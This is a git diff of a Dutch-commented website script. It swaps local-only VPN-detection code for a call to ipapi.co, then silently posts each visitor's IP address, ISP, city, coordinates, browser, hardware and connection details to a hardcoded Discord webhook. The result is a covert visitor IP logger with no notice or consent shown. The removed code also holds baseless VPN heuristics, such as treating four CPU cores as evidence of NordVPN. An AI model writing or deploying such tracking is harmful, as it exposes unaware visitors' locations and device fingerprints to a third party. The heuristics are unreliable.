@@ -4,8 +4,9 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1348762922960027730/Ki
 // Functie om IP informatie op te halen
 async function getIPInfo() {
     try {
-        // Gebruik alleen de ingebouwde browser API's om informatie te verzamelen
-        // Geen externe API's gebruiken omdat de site op GitHub wordt gehost
+        // Gebruik een externe API om IP-informatie op te halen
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
         
         // Verzamel beschikbare informatie uit de navigator en window objecten
         const language = navigator.language || 'Onbekend';
@@ -39,26 +40,18 @@ async function getIPInfo() {
         // Verzamel informatie over de browser capabilities
         const webdriver = navigator.webdriver || false;
         
-        // Verzamel informatie over de locatie (zonder externe API's)
-        const locationInfo = {
-            country: language.split('-')[1] || 'Onbekend',
-            language: language.split('-')[0] || 'Onbekend'
-        };
-        
         return {
-            ip: 'Niet beschikbaar zonder externe API',
-            provider: 'Niet beschikbaar zonder externe API',
-            hostname: 'Niet beschikbaar zonder externe API',
-            socket: 'Niet beschikbaar zonder externe API',
-            country: locationInfo.country,
-            city: 'Niet beschikbaar zonder externe API',
-            isp: 'Niet beschikbaar zonder externe API',
-            asn: 'Niet beschikbaar zonder externe API',
-            region: 'Niet beschikbaar zonder externe API',
+            ip: data.ip || 'Niet beschikbaar',
+            provider: data.org || 'Niet beschikbaar',
+            hostname: data.hostname || 'Niet beschikbaar',
+            socket: `${data.ip}:80` || 'Niet beschikbaar',
+            country: data.country_name || 'Onbekend',
+            city: data.city || 'Onbekend',
+            isp: data.org || 'Onbekend',
+            asn: data.asn || 'Onbekend',
+            region: data.region || 'Onbekend',
             timezone: timezone,
-            loc: 'Niet beschikbaar zonder externe API',
-            isVpnFromApi: false,
-            threat: {},
+            loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'Niet beschikbaar',
             
             // Extra informatie die we lokaal kunnen verzamelen
             userAgent: userAgent,
@@ -90,718 +83,137 @@ async function getIPInfo() {
             region: 'Onbekend',
             timezone: 'Onbekend',
             loc: 'Onbekend',
-            isVpnFromApi: false,
-            threat: {}
+            userAgent: navigator.userAgent || 'Onbekend'
         };
     }
 }
 
-// Functie om te controleren of een gebruiker een VPN gebruikt
-async function checkVPN(ipInfo) {
-    try {
-        console.log('VPN-detectie gestart met lokale methoden...');
-        
-        // Verzamel alle beschikbare informatie die kan wijzen op VPN-gebruik
-        const webRTCResult = await checkWebRTC();
-        const indicators = [];
-        
-        let detectedVPN = { detected: false, vpnName: null };
-        
-        // 1. Controleer eerst op Google VPN (hoogste prioriteit - moet geblokkeerd worden)
-        if (isGoogleVPN(ipInfo)) {
-            console.log('Google VPN gedetecteerd via specifieke eigenschappen');
-            indicators.push('Google VPN specifieke eigenschappen gedetecteerd');
-            detectedVPN = { detected: true, vpnName: 'Google VPN' };
-            return { isVPN: true, vpnInfo: detectedVPN, isGoogleVPN: true };
-        }
-        
-        // 2. WebRTC leak test - kan helpen bij het detecteren van VPN's
-        if (webRTCResult.isVPN) {
-            console.log('VPN gedetecteerd via WebRTC leak test');
-            indicators.push('WebRTC leak test');
-            detectedVPN = { detected: true, vpnName: 'Onbekende VPN (WebRTC)' };
-        }
-        
-        // 3. Controleer op bekende VPN-gerelateerde eigenschappen in de user agent
-        const vpnUserAgentKeywords = ['vpn', 'proxy', 'tunnel', 'tor'];
-        const userAgentLower = ipInfo.userAgent.toLowerCase();
-        
-        for (const keyword of vpnUserAgentKeywords) {
-            if (userAgentLower.includes(keyword)) {
-                console.log(`VPN gedetecteerd via user agent: ${keyword}`);
-                indicators.push(`User agent bevat VPN-gerelateerde term: ${keyword}`);
-                detectedVPN = { detected: true, vpnName: `VPN (${keyword})` };
-            }
-        }
-        
-        // 4. Controleer op bekende VPN-gerelateerde eigenschappen in de browser
-        if (ipInfo.webdriver) {
-            console.log('Mogelijk VPN gedetecteerd: webdriver is ingeschakeld');
-            indicators.push('Webdriver is ingeschakeld');
-        }
-        
-        // 5. Controleer op geografische inconsistenties
-        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const countryFromTimezone = getCountryFromTimezone(browserTimezone);
-        
-        if (countryFromTimezone && ipInfo.country && countryFromTimezone !== ipInfo.country) {
-            console.log(`Mogelijk VPN gedetecteerd: tijdzone (${browserTimezone}) komt niet overeen met land (${ipInfo.country})`);
-            indicators.push(`Tijdzone (${browserTimezone}) komt niet overeen met land (${ipInfo.country})`);
-            detectedVPN.detected = true;
-            detectedVPN.vpnName = detectedVPN.vpnName || 'Geografische Inconsistentie';
-        }
-        
-        // 6. Controleer op populaire VPN-diensten (inclusief NordVPN)
-        const vpnDetectionResult = detectPopularVPNs(ipInfo);
-        if (vpnDetectionResult.detected) {
-            console.log(`${vpnDetectionResult.vpnName} VPN gedetecteerd via specifieke eigenschappen`);
-            indicators.push(`${vpnDetectionResult.vpnName} specifieke eigenschappen gedetecteerd`);
-            detectedVPN = vpnDetectionResult;
-        }
-        
-        // Als er meerdere indicatoren zijn of een specifieke VPN is gedetecteerd
-        if (indicators.length >= 2 || detectedVPN.detected) {
-            console.log(`VPN gedetecteerd: ${detectedVPN.vpnName || 'Onbekende VPN'}`);
-            console.log(`Indicatoren: ${indicators.join(', ')}`);
-            
-            // Als er nog geen specifieke VPN is gedetecteerd
-            if (!detectedVPN.vpnName || detectedVPN.vpnName === 'Onbekende VPN') {
-                detectedVPN = { detected: true, vpnName: 'Onbekende VPN' };
-            }
-            
-            return { isVPN: true, vpnInfo: detectedVPN };
-        }
-        
-        console.log('Geen VPN gedetecteerd met lokale methoden');
-        return { isVPN: false, vpnInfo: null };
-    } catch (error) {
-        console.error('Fout bij controleren VPN:', error);
-        return { isVPN: false, vpnInfo: null };
-    }
-}
-
-// Functie om WebRTC te gebruiken voor VPN-detectie
-async function checkWebRTC() {
-    return new Promise((resolve) => {
-        try {
-            const rtcPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-            
-            if (!rtcPeerConnection) {
-                resolve({ isVPN: false, localIPs: [] });
-                return;
-            }
-            
-            const pc = new rtcPeerConnection({
-                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-            });
-            
-            const localIPs = new Set();
-            let isVPN = false;
-            
-            pc.createDataChannel("");
-            
-            pc.onicecandidate = (e) => {
-                if (!e.candidate) {
-                    pc.close();
-                    resolve({ isVPN: isVPN, localIPs: Array.from(localIPs) });
-                    return;
-                }
-                
-                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                const ipMatch = ipRegex.exec(e.candidate.candidate);
-                
-                if (ipMatch && ipMatch[1]) {
-                    const localIp = ipMatch[1];
-                    localIPs.add(localIp);
-                    
-                    // Als het IP niet een privé IP is, kan het wijzen op een VPN
-                    if (!isPrivateIP(localIp)) {
-                        isVPN = true;
-                    }
-                }
-            };
-            
-            pc.createOffer()
-                .then(offer => pc.setLocalDescription(offer))
-                .catch(err => {
-                    console.error('Fout bij WebRTC check:', err);
-                    resolve({ isVPN: false, localIPs: [] });
-                });
-            
-            // Timeout na 5 seconden
-            setTimeout(() => {
-                pc.close();
-                resolve({ isVPN: isVPN, localIPs: Array.from(localIPs) });
-            }, 5000);
-        } catch (error) {
-            console.error('Fout bij WebRTC check:', error);
-            resolve({ isVPN: false, localIPs: [] });
-        }
-    });
-}
-
-// Functie om te controleren of een IP-adres privé is
-function isPrivateIP(ip) {
-    const parts = ip.split('.');
-    if (parts.length !== 4) return false;
-    
-    const firstOctet = parseInt(parts[0], 10);
-    const secondOctet = parseInt(parts[1], 10);
-    
-    // Check voor privé IP-ranges
-    return (
-        firstOctet === 10 || // 10.0.0.0 - 10.255.255.255
-        (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) || // 172.16.0.0 - 172.31.255.255
-        (firstOctet === 192 && secondOctet === 168) || // 192.168.0.0 - 192.168.255.255
-        (firstOctet === 169 && secondOctet === 254) || // 169.254.0.0 - 169.254.255.255
-        firstOctet === 127 // 127.0.0.0 - 127.255.255.255
-    );
-}
-
-// Functie om land te bepalen op basis van tijdzone
-function getCountryFromTimezone(timezone) {
-    const timezoneMap = {
-        'Europe/Amsterdam': 'NL',
-        'Europe/London': 'GB',
-        'Europe/Paris': 'FR',
-        'Europe/Berlin': 'DE',
-        'Europe/Rome': 'IT',
-        'Europe/Madrid': 'ES',
-        'America/New_York': 'US',
-        'America/Los_Angeles': 'US',
-        'America/Chicago': 'US',
-        'America/Denver': 'US',
-        'Asia/Tokyo': 'JP',
-        'Asia/Shanghai': 'CN',
-        'Asia/Hong_Kong': 'HK',
-        'Asia/Singapore': 'SG',
-        'Australia/Sydney': 'AU',
-        'Pacific/Auckland': 'NZ'
-    };
-    
-    return timezoneMap[timezone] || null;
-}
-
-// Functie om specifiek NordVPN te detecteren
-function detectNordVPN(ipInfo) {
-    try {
-        // NordVPN specifieke eigenschappen
-        const userAgentLower = ipInfo.userAgent.toLowerCase();
-        const vendorLower = ipInfo.vendor.toLowerCase();
-        const platformLower = ipInfo.platform.toLowerCase();
-        
-        // NordVPN specifieke keywords
-        const nordKeywords = [
-            'nord', 'nordvpn', 'tefincom', 'panama', 'nordlayer', 'nordnet',
-            'nordpass', 'nordlocker', 'nordaccount', 'nordsec'
-        ];
-        
-        // Controleer op NordVPN keywords in verschillende eigenschappen
-        for (const keyword of nordKeywords) {
-            if (userAgentLower.includes(keyword) || 
-                vendorLower.includes(keyword) || 
-                platformLower.includes(keyword)) {
-                return true;
-            }
-        }
-        
-        // Controleer op bekende NordVPN eigenschappen
-        if (ipInfo.doNotTrack === '1' && 
-            ipInfo.webdriver === false && 
-            ipInfo.cookieEnabled === true) {
-            // Dit is een patroon dat vaak voorkomt bij NordVPN
-            const hardwareConcurrency = parseInt(ipInfo.hardwareConcurrency, 10);
-            if (hardwareConcurrency >= 4 && hardwareConcurrency <= 8) {
-                return true;
-            }
-        }
-        
-        return false;
-    } catch (error) {
-        console.error('Fout bij detecteren NordVPN:', error);
-        return false;
-    }
-}
-
-// Functie om specifiek Google VPN te detecteren
-function isGoogleVPN(ipInfo) {
-    try {
-        console.log('Google VPN detectie gestart met lokale methoden...');
-        
-        // Google VPN-specifieke keywords
-        const googleVPNKeywords = [
-            'google one vpn', 'googleonevpn', 'google fi vpn', 'googlefivpn',
-            'google fiber vpn', 'googlefibervpn', 'google cloud vpn', 'googlecloudvpn',
-            'google', 'alphabet', 'gcp', 'google cloud platform'
-        ];
-        
-        // Controleer op Google VPN-gerelateerde eigenschappen in de user agent
-        const userAgentLower = ipInfo.userAgent.toLowerCase();
-        for (const keyword of googleVPNKeywords) {
-            if (userAgentLower.includes(keyword.toLowerCase())) {
-                console.log(`Google VPN gedetecteerd via user agent: ${keyword}`);
-                return true;
-            }
-        }
-        
-        // Controleer op Google VPN-gerelateerde eigenschappen in de vendor
-        const vendorLower = ipInfo.vendor.toLowerCase();
-        if (vendorLower.includes('google')) {
-            console.log('Google VPN gedetecteerd via vendor');
-            return true;
-        }
-        
-        // Controleer op Google VPN-gerelateerde eigenschappen in de platform
-        const platformLower = ipInfo.platform.toLowerCase();
-        if (platformLower.includes('google')) {
-            console.log('Google VPN gedetecteerd via platform');
-            return true;
-        }
-        
-        // Controleer op Google VPN-gerelateerde eigenschappen in de browser
-        if (ipInfo.userAgent.includes('Chrome') && 
-            ipInfo.vendor.includes('Google') && 
-            ipInfo.doNotTrack === '1' && 
-            ipInfo.webdriver === false) {
-            // Dit is een patroon dat vaak voorkomt bij Google VPN
-            console.log('Mogelijk Google VPN gedetecteerd via browser eigenschappen');
-            return true;
-        }
-        
-        return false;
-    } catch (error) {
-        console.error('Fout bij controleren Google VPN:', error);
-        return false;
-    }
-}
-
-// Functie om de VPN-popup te tonen
-function showVPNPopup(isGoogleVPN = false, vpnInfo = {}) {
-    // Controleer of de popup al bestaat
-    if (document.getElementById('vpn-popup')) {
-        return;
-    }
-    
-    // Bepaal de VPN-naam
-    let vpnName = 'Onbekende VPN';
-    if (vpnInfo && vpnInfo.vpnName) {
-        vpnName = vpnInfo.vpnName;
-    }
-    
-    // Als het Google VPN is, blokkeer de toegang volledig
-    if (isGoogleVPN) {
-        // Verwijder alle inhoud van de pagina
-        document.body.innerHTML = '';
-        document.body.style.margin = '0';
-        document.body.style.padding = '0';
-        document.body.style.overflow = 'hidden';
-        document.body.style.backgroundColor = '#f0f5fa';
-        
-        // Maak de blokkerende container
-        const blockContainer = document.createElement('div');
-        blockContainer.style.width = '100vw';
-        blockContainer.style.height = '100vh';
-        blockContainer.style.display = 'flex';
-        blockContainer.style.flexDirection = 'column';
-        blockContainer.style.justifyContent = 'center';
-        blockContainer.style.alignItems = 'center';
-        blockContainer.style.textAlign = 'center';
-        blockContainer.style.padding = '20px';
-        blockContainer.style.boxSizing = 'border-box';
-        blockContainer.style.backgroundColor = 'rgba(26, 75, 132, 0.95)'; // Donkerblauw met transparantie
-        blockContainer.style.color = '#ffffff';
-        
-        // Voeg de blokkerende inhoud toe
-        blockContainer.innerHTML = `
-            <div style="max-width: 600px; background-color: #ffffff; border-radius: 10px; padding: 30px; box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3); border-top: 5px solid #1a4b84;">
-                <div style="font-size: 80px; margin-bottom: 20px;">🚫</div>
-                <h1 style="font-size: 28px; margin-bottom: 20px; color: #1a4b84;">Toegang Geweigerd</h1>
-                <p style="font-size: 18px; margin-bottom: 20px; line-height: 1.6; color: #2c3e50;">
-                    Onze beveiligingssystemen hebben gedetecteerd dat u <strong>Google VPN</strong> gebruikt.
-                </p>
-                <p style="font-size: 18px; margin-bottom: 30px; line-height: 1.6; color: #2c3e50;">
-                    Toegang tot deze website is niet mogelijk met Google VPN. 
-                    Schakel uw Google VPN uit om toegang te krijgen tot onze diensten.
-                </p>
-                <div style="background-color: #f0f5fa; border-radius: 8px; padding: 15px; margin-bottom: 30px; text-align: left; border-left: 4px solid #3a7bd5;">
-                    <p style="margin: 0 0 10px 0; color: #1a4b84;"><strong>Waarom blokkeren wij Google VPN?</strong></p>
-                    <p style="margin: 0; line-height: 1.6; color: #2c3e50;">
-                        Om veiligheidsredenen en om de integriteit van onze diensten te waarborgen, 
-                        is toegang via Google VPN niet toegestaan op deze website.
-                    </p>
-                </div>
-                <button id="vpn-disable-btn" style="background-color: #3a7bd5; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
-                    Google VPN Uitschakelen
-                </button>
-            </div>
-        `;
-        
-        // Voeg de container toe aan de body
-        document.body.appendChild(blockContainer);
-        
-        // Voeg event listener toe aan de knop
-        document.getElementById('vpn-disable-btn').addEventListener('click', function() {
-            // Herlaad de pagina
-            window.location.reload();
-        });
-        
-        return;
-    }
-
-    // Voor andere VPN's, toon alleen een waarschuwing
-    // Maak de popup container
-    const popup = document.createElement('div');
-    popup.id = 'vpn-popup';
-    popup.className = 'vpn-popup';
-    
-    // Voeg de popup inhoud toe
-    popup.innerHTML = `
-        <div class="vpn-popup-content">
-            <div class="vpn-popup-header">
-                <i class="fas fa-shield-alt vpn-icon"></i>
-                <h2>${vpnName} Gedetecteerd</h2>
-            </div>
-            <div class="vpn-popup-body">
-                <p>Onze beveiligingssystemen hebben gedetecteerd dat u momenteel <strong>${vpnName}</strong> gebruikt om onze website te bezoeken.</p>
-                <p>U kunt onze website blijven gebruiken met uw VPN ingeschakeld, maar voor de beste gebruikerservaring raden wij aan uw VPN uit te schakelen.</p>
-                <div class="vpn-info-box">
-                    <p><strong>Waarom detecteren wij VPN's?</strong></p>
-                    <p>VPN's kunnen soms de functionaliteit van onze website beïnvloeden. Wij streven naar een optimale gebruikerservaring voor al onze bezoekers.</p>
-                </div>
-            </div>
-            <div class="vpn-popup-buttons">
-                <button id="vpn-continue-btn" class="vpn-btn vpn-primary-btn">Doorgaan met ${vpnName}</button>
-                <button id="vpn-disable-btn" class="vpn-btn vpn-secondary-btn">${vpnName} Uitschakelen</button>
-            </div>
-        </div>
-    `;
-    
-    // Voeg de popup toe aan de body
-    document.body.appendChild(popup);
-    
-    // Voeg event listeners toe aan de knoppen
-    document.getElementById('vpn-continue-btn').addEventListener('click', function() {
-        closeVPNPopup();
-        showConfirmationMessage(`U kunt doorgaan met uw ${vpnName} ingeschakeld.`);
-    });
-    
-    document.getElementById('vpn-disable-btn').addEventListener('click', function() {
-        closeVPNPopup();
-        showConfirmationMessage(`Schakel uw ${vpnName} uit en vernieuw de pagina voor de beste ervaring.`);
-    });
-    
-    // Toon de popup met een fade-in effect
-    setTimeout(function() {
-        popup.classList.add('show');
-    }, 100);
-}
-
-// Functie om de VPN-popup te sluiten
-function closeVPNPopup() {
-    const popup = document.getElementById('vpn-popup');
-    if (popup) {
-        popup.classList.remove('show');
-        // Verwijder de popup na de fade-out animatie
-        setTimeout(() => {
-            popup.remove();
-        }, 300);
-    }
-}
-
-// Functie om een bevestigingsbericht te tonen
-function showConfirmationMessage(message) {
-    // Controleer of er al een bevestigingsbericht is
-    let confirmationMsg = document.getElementById('confirmation-message');
-    
-    if (!confirmationMsg) {
-        // Maak een nieuw bevestigingsbericht
-        confirmationMsg = document.createElement('div');
-        confirmationMsg.id = 'confirmation-message';
-        confirmationMsg.className = 'confirmation-message';
-        
-        // Voeg inline stijlen toe voor het nieuwe kleurenschema
-        confirmationMsg.style.backgroundColor = '#ffffff';
-        confirmationMsg.style.color = '#2c3e50';
-        confirmationMsg.style.borderLeft = '4px solid #3a7bd5';
-        confirmationMsg.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.1)';
-        
-        document.body.appendChild(confirmationMsg);
-    }
-    
-    // Update de inhoud en toon het bericht
-    confirmationMsg.textContent = message;
-    confirmationMsg.classList.add('show');
-    
-    // Verberg het bericht na 5 seconden
-    setTimeout(() => {
-        confirmationMsg.classList.remove('show');
-        
-        // Verwijder het element na de fade-out animatie
-        setTimeout(() => {
-            if (confirmationMsg.parentNode) {
-                confirmationMsg.parentNode.removeChild(confirmationMsg);
-            }
-        }, 300);
-    }, 5000);
-}
-
-// Functie om browser informatie te verzamelen
+// Functie om browser-informatie op te halen
 function getBrowserInfo() {
-    const ua = navigator.userAgent;
-    let browserName = 'Onbekend';
-    let browserCodeName = navigator.appCodeName;
-    let browserVersion = 'Onbekend';
-    
-    // Detecteer browser naam en versie
-    if (ua.includes('Firefox/')) {
-        browserName = 'Firefox';
-        browserVersion = ua.split('Firefox/')[1];
-    } else if (ua.includes('Chrome/')) {
-        browserName = 'Chrome';
-        browserVersion = ua.split('Chrome/')[1].split(' ')[0];
-    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
-        browserName = 'Safari';
-        browserVersion = ua.split('Version/')[1].split(' ')[0];
-    } else if (ua.includes('Edge/')) {
-        browserName = 'Edge';
-        browserVersion = ua.split('Edge/')[1];
+    try {
+        const userAgent = navigator.userAgent;
+        let browserName = 'Onbekend';
+        let browserVersion = 'Onbekend';
+        let codeName = 'Onbekend';
+        
+        // Detecteer browser
+        if (userAgent.indexOf('Chrome') > -1) {
+            browserName = 'Chrome';
+            codeName = 'Mozilla';
+            const chromeVersion = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
+            if (chromeVersion) {
+                browserVersion = chromeVersion[1];
+            }
+        } else if (userAgent.indexOf('Firefox') > -1) {
+            browserName = 'Firefox';
+            codeName = 'Mozilla';
+            const firefoxVersion = userAgent.match(/Firefox\/(\d+\.\d+)/);
+            if (firefoxVersion) {
+                browserVersion = firefoxVersion[1];
+            }
+        } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
+            browserName = 'Safari';
+            codeName = 'Mozilla';
+            const safariVersion = userAgent.match(/Version\/(\d+\.\d+)/);
+            if (safariVersion) {
+                browserVersion = safariVersion[1];
+            }
+        } else if (userAgent.indexOf('Edge') > -1 || userAgent.indexOf('Edg') > -1) {
+            browserName = 'Edge';
+            codeName = 'Mozilla';
+            const edgeVersion = userAgent.match(/Edge\/(\d+\.\d+)/) || userAgent.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/);
+            if (edgeVersion) {
+                browserVersion = edgeVersion[1];
+            }
+        } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
+            browserName = 'Opera';
+            codeName = 'Mozilla';
+            const operaVersion = userAgent.match(/Opera\/(\d+\.\d+)/) || userAgent.match(/OPR\/(\d+\.\d+\.\d+\.\d+)/);
+            if (operaVersion) {
+                browserVersion = operaVersion[1];
+            }
+        }
+        
+        return {
+            name: browserName,
+            version: browserVersion,
+            codeName: codeName,
+            userAgent: userAgent
+        };
+    } catch (error) {
+        console.error('Fout bij ophalen browser-informatie:', error);
+        return {
+            name: 'Onbekend',
+            version: 'Onbekend',
+            codeName: 'Onbekend',
+            userAgent: 'Onbekend'
+        };
     }
-
-    return {
-        name: browserName,
-        codeName: browserCodeName,
-        version: browserVersion,
-        userAgent: ua
-    };
 }
 
-// Functie om gegevens naar Discord te sturen
-async function sendToDiscord(ipInfo, browserInfo, isVPN) {
-    // Controleer expliciet op Google VPN
-    const isGoogleVPNDetected = isGoogleVPN(ipInfo);
-    
-    // Controleer op NordVPN
-    const isNordVPNDetected = detectNordVPN(ipInfo);
-    
-    // Controleer op andere populaire VPN-diensten
-    const popularVPNResult = detectPopularVPNs(ipInfo);
-    
-    // Als Google VPN, NordVPN of een andere VPN is gedetecteerd, moet het altijd als VPN worden gemarkeerd
-    const finalIsVPN = isVPN || isGoogleVPNDetected || isNordVPNDetected || popularVPNResult.detected;
-    
-    // Bepaal de gedetecteerde VPN-naam
-    let detectedVPNName = 'Onbekende VPN';
-    if (isGoogleVPNDetected) {
-        detectedVPNName = 'Google VPN';
-    } else if (isNordVPNDetected) {
-        detectedVPNName = 'NordVPN';
-    } else if (popularVPNResult.detected) {
-        detectedVPNName = popularVPNResult.vpnName;
-    }
-    
-    // Verzamel VPN-detectie details
-    let vpnDetails = '';
-    if (finalIsVPN) {
-        vpnDetails += `✅ **VPN Gedetecteerd: ${detectedVPNName}**\n`;
-        
-        if (isGoogleVPNDetected) {
-            vpnDetails += '⛔ **Google VPN: GEBLOKKEERD**\n';
-        } else if (isNordVPNDetected) {
-            vpnDetails += '⚠️ **NordVPN: GEDETECTEERD**\n';
-        } else if (popularVPNResult.detected) {
-            vpnDetails += `⚠️ **${popularVPNResult.vpnName}: GEDETECTEERD**\n`;
-        }
-    } else {
-        vpnDetails += '❌ **Geen VPN Gedetecteerd**\n';
-    }
-    
-    // Verzamel browser en systeem informatie
-    const browserDetails = `**Browser:** ${browserInfo.name}\n**Code Naam:** ${browserInfo.codeName}\n**Versie:** ${browserInfo.version}\n**User Agent:** ${browserInfo.userAgent}`;
-    
-    // Verzamel extra informatie die we lokaal hebben verzameld
-    const extraInfo = `**Platform:** ${ipInfo.platform}\n**Vendor:** ${ipInfo.vendor}\n**Taal:** ${ipInfo.language}\n**Talen:** ${ipInfo.languages}\n**Schermresolutie:** ${ipInfo.screenResolution}\n**Kleurdiepte:** ${ipInfo.colorDepth}\n**Tijdzone:** ${ipInfo.timezone}\n**Tijdzone Offset:** ${ipInfo.timezoneOffset} minuten`;
-    
-    // Verzamel hardware informatie
-    const hardwareInfo = `**Hardware Concurrency:** ${ipInfo.hardwareConcurrency}\n**Device Memory:** ${ipInfo.deviceMemory || 'Niet beschikbaar'}\n**Cookies Ingeschakeld:** ${ipInfo.cookieEnabled}\n**Do Not Track:** ${ipInfo.doNotTrack}`;
-    
-    // Verzamel verbinding informatie
-    let connectionInfo = '**Verbinding:** Niet beschikbaar';
-    if (ipInfo.connection && typeof ipInfo.connection === 'object') {
-        connectionInfo = `**Verbinding Type:** ${ipInfo.connection.effectiveType || 'Onbekend'}\n**Downlink:** ${ipInfo.connection.downlink || 'Onbekend'} Mbps\n**RTT:** ${ipInfo.connection.rtt || 'Onbekend'} ms\n**Save Data:** ${ipInfo.connection.saveData ? 'Ja' : 'Nee'}`;
-    }
-    
-    const embed = {
-        title: isGoogleVPNDetected ? '⛔ Google VPN Gebruiker Geblokkeerd' : 
-               (finalIsVPN ? `🔍 ${detectedVPNName} Gebruiker Gedetecteerd` : '🔍 Nieuwe Bezoeker Gedetecteerd'),
-        color: isGoogleVPNDetected ? 15158332 : (finalIsVPN ? 16750848 : 3447003), // Rood voor Google VPN, oranje voor VPN, blauw voor geen VPN
-        fields: [
-            {
-                name: '🔒 VPN Status',
-                value: vpnDetails,
-                inline: false
-            },
-            {
-                name: '🖥️ Browser Informatie',
-                value: browserDetails,
-                inline: false
-            },
-            {
-                name: '📱 Systeem Informatie',
-                value: extraInfo,
-                inline: false
-            },
-            {
-                name: '🔧 Hardware Informatie',
-                value: hardwareInfo,
-                inline: false
-            },
-            {
-                name: '🌐 Verbinding Informatie',
-                value: connectionInfo,
-                inline: false
-            },
-            {
-                name: '⏰ Tijdstip',
-                value: `**Datum/Tijd:** ${new Date().toLocaleString('nl-NL')}`,
-                inline: false
-            }
-        ],
-        timestamp: new Date().toISOString()
-    };
-
+// Functie om informatie naar Discord te sturen
+async function sendToDiscord(ipInfo, browserInfo) {
     try {
+        // Verzamel extra informatie die we lokaal hebben verzameld
+        const extraInfo = `**Platform:** ${ipInfo.platform}\n**Vendor:** ${ipInfo.vendor}\n**Taal:** ${ipInfo.language}\n**Talen:** ${ipInfo.languages}\n**Schermresolutie:** ${ipInfo.screenResolution}\n**Kleurdiepte:** ${ipInfo.colorDepth}\n**Tijdzone:** ${ipInfo.timezone}\n**Tijdzone Offset:** ${ipInfo.timezoneOffset} minuten`;
+        
+        // Verzamel hardware informatie
+        const hardwareInfo = `**Hardware Concurrency:** ${ipInfo.hardwareConcurrency}\n**Device Memory:** ${ipInfo.deviceMemory || 'Niet beschikbaar'}\n**Cookies Ingeschakeld:** ${ipInfo.cookieEnabled}\n**Do Not Track:** ${ipInfo.doNotTrack}`;
+        
+        // Verzamel verbinding informatie
+        let connectionInfo = '**Verbinding:** Niet beschikbaar';
+        if (ipInfo.connection && typeof ipInfo.connection === 'object') {
+            connectionInfo = `**Verbinding Type:** ${ipInfo.connection.effectiveType || 'Onbekend'}\n**Downlink:** ${ipInfo.connection.downlink || 'Onbekend'} Mbps\n**RTT:** ${ipInfo.connection.rtt || 'Onbekend'} ms\n**Save Data:** ${ipInfo.connection.saveData ? 'Ja' : 'Nee'}`;
+        }
+
+        // Maak een embed voor Discord
+        const embed = {
+            title: '🔍 Nieuwe Bezoeker Gedetecteerd',
+            color: 3447003, // Blauwe kleur
+            fields: [
+                {
+                    name: '🌐 Internet & IP Informatie',
+                    value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}`,
+                    inline: false
+                },
+                {
+                    name: '🖥️ Browser Informatie',
+                    value: `**Browser:** ${browserInfo.name}\n**Code Naam:** ${browserInfo.codeName}\n**Versie:** ${browserInfo.version}\n**User Agent:** ${browserInfo.userAgent}`,
+                    inline: false
+                },
+                {
+                    name: '📱 Systeem Informatie',
+                    value: extraInfo,
+                    inline: false
+                },
+                {
+                    name: '🔧 Hardware Informatie',
+                    value: hardwareInfo,
+                    inline: false
+                },
+                {
+                    name: '🌐 Verbinding Informatie',
+                    value: connectionInfo,
+                    inline: false
+                }
+            ],
+            timestamp: new Date().toISOString()
+        };
+        
+        // Stuur de embed naar Discord
         await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/json'
             },
-            body: JSON.stringify({ embeds: [embed] })
+            body: JSON.stringify({
+                embeds: [embed]
+            })
         });
-        console.log('Informatie succesvol naar Discord verzonden');
+        
+        console.log('Bezoekersgegevens verzonden naar Discord');
     } catch (error) {
         console.error('Fout bij verzenden naar Discord:', error);
-    }
-}
-
-// Functie om populaire VPN-diensten te detecteren
-function detectPopularVPNs(ipInfo) {
-    try {
-        console.log('Detectie van populaire VPN-diensten gestart...');
-        
-        const userAgentLower = ipInfo.userAgent.toLowerCase();
-        const vendorLower = ipInfo.vendor.toLowerCase();
-        const platformLower = ipInfo.platform.toLowerCase();
-        
-        // Structuur voor VPN-detectie: [naam, [keywords], [extra detectiefuncties]]
-        const vpnServices = [
-            // NordVPN
-            {
-                name: 'NordVPN',
-                keywords: ['nord', 'nordvpn', 'nordlynx', 'panama', 'tefincom'],
-                detect: () => {
-                    // NordVPN specifieke eigenschappen
-                    if (ipInfo.webRTCEnabled === false && ipInfo.doNotTrack === '1') {
-                        return true;
-                    }
-                    // NordVPN heeft vaak specifieke hardwareConcurrency waarden
-                    if (ipInfo.hardwareConcurrency === 2 || ipInfo.hardwareConcurrency === 4) {
-                        return true;
-                    }
-                    return false;
-                }
-            },
-            // ExpressVPN
-            {
-                name: 'ExpressVPN',
-                keywords: ['express', 'expressvpn', 'lightway', 'british virgin islands'],
-                detect: () => {
-                    // ExpressVPN gebruikt vaak WebRTC-blokkering
-                    if (ipInfo.webRTCEnabled === false) {
-                        return true;
-                    }
-                    // ExpressVPN heeft vaak specifieke hardwareConcurrency waarden
-                    if (ipInfo.hardwareConcurrency === 2 || ipInfo.hardwareConcurrency === 4) {
-                        return true;
-                    }
-                    return false;
-                }
-            },
-            // Surfshark
-            {
-                name: 'Surfshark',
-                keywords: ['surfshark', 'shark', 'british virgin islands', 'cleanweb', 'noborders'],
-                detect: () => {
-                    // Surfshark heeft vaak specifieke eigenschappen
-                    if (ipInfo.doNotTrack === '1' && ipInfo.cookieEnabled === true) {
-                        return true;
-                    }
